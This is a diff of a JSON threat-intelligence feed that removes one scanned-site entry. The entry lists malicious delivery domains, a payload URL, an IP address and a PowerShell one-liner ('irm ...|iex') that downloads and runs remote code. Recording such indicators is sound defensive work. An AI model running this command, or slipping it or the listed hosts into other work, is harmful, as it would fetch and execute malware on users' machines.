@@ -383,34 +383,5 @@
     ],
     "ReportId": "cmwf9tn7k0fqr0omliwntu216",
     "ScannedAt": "2026-11-13T17:48:56.960000+00:00"
-  },
-  {
-    "UrlDomain": "duocthaolila.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "base.gateway.tenderly.co"
-    ],
-    "PayloadUrl": [
-      "http://timelevel12.com/big"
-    ],
-    "IP": [
-      "202.92.4.34"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/1d9b91a9afa1746c",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://base.gateway.tenderly.co",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/1d9b91a9afa1746c'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/1d9b91a9afa1746c"
-    ],
-    "ReportId": "cmwf4esed0fpg0omlmg0cwhh2",
-    "ScannedAt": "2026-11-13T15:17:25.750000+00:00"
   }
 ]
